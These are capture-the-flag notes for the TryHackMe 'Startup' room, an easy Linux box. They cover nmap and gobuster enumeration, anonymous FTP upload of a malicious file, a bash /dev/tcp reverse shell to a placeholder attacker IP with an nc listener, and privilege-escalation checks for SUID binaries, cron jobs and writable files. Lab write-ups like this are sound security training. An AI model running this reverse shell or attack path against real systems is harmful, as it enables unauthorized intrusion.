🔵 Startup - Notes

📝 Information

    Platform: TryHackMe
    OS: Linux
    Difficulty: Easy
    Main Vulnerabilities: FTP Anonymous Access / File Upload / Web Enumeration / Privilege Escalation

🔎 Enumeration

Nmap

First, scan the target to identify open ports and services.

Command:

nmap -sC -sV -oN scan.txt MACHINE_IP

Important ports:

21/tcp   FTP
22/tcp   SSH
80/tcp   HTTP

Important findings:

    FTP service available.
    Anonymous login enabled.
    Web server running on port 80.

📂 FTP Enumeration

Connect to FTP:

ftp MACHINE_IP

Try anonymous login:

anonymous

Enumerate files:

ls

Download interesting files:

get filename

Important:

    Check if FTP allows file upload.
    Uploaded files may be accessible through the web server.

Upload test:

put filename

🌐 Web Enumeration

Access the website:

http://MACHINE_IP

Directory enumeration:

gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt

Look for:

    Upload directories.
    Hidden files.
    Configuration files.
    Backup files.

Important:

    Files uploaded through FTP may be executed through the web server.

💥 Exploitation

Main attack path:

    1. Find FTP anonymous access.
    2. Upload a malicious file.
    3. Access it through the web server.
    4. Obtain a reverse shell.

Example reverse shell:

Create payload:

bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

Start listener:

nc -lvnp 4444

Access the uploaded file through the browser.

After obtaining a shell:

Upgrade shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Check current user:

whoami

🖥️ Post Exploitation

System information:

uname -a

Check users:

cat /etc/passwd

Search for important files:

find / -name "*.txt" 2>/dev/null

Check sudo permissions:

sudo -l

🔼 Privilege Escalation

Enumerate:

SUID binaries:

find / -perm -4000 2>/dev/null

Cron jobs:

cat /etc/crontab

Check writable files:

find / -writable -type f 2>/dev/null

Look for:

    Misconfigured services.
    Writable scripts.
    Weak permissions.

Use discovered vulnerabilities to escalate privileges.

🚩 Flags Location

User:

/home/username/user.txt

Root:

/root/root.txt

🧠 Key Takeaways

    Anonymous FTP access can expose sensitive files.
    Always test if file upload is possible.
    Web servers may execute uploaded files.
    Enumerate the system after obtaining a shell.
    Privilege escalation requires checking permissions and misconfigurations.
